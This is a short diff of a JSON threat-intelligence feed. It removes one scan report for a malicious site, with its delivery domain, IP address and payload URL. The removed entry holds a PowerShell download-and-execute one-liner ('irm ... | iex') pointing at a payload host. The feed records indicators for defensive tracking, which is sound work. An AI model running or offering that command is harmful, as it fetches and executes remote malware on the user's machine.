@@ -8905,27 +8905,5 @@
     ],
     "ReportId": "cmwktvio01fxo0omlc5hd3w8p",
     "ScannedAt": "2026-11-17T15:09:07.568000+00:00"
-  },
-  {
-    "UrlDomain": "frpdanismanlik.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "104.21.64.153"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/f6f41b91b95bf127",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/f6f41b91b95bf127'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/f6f41b91b95bf127"
-    ],
-    "ReportId": "cmwkte9y71fs10omlyn3mr6rc",
-    "ScannedAt": "2026-11-17T14:55:43.108000+00:00"
   }
 ]
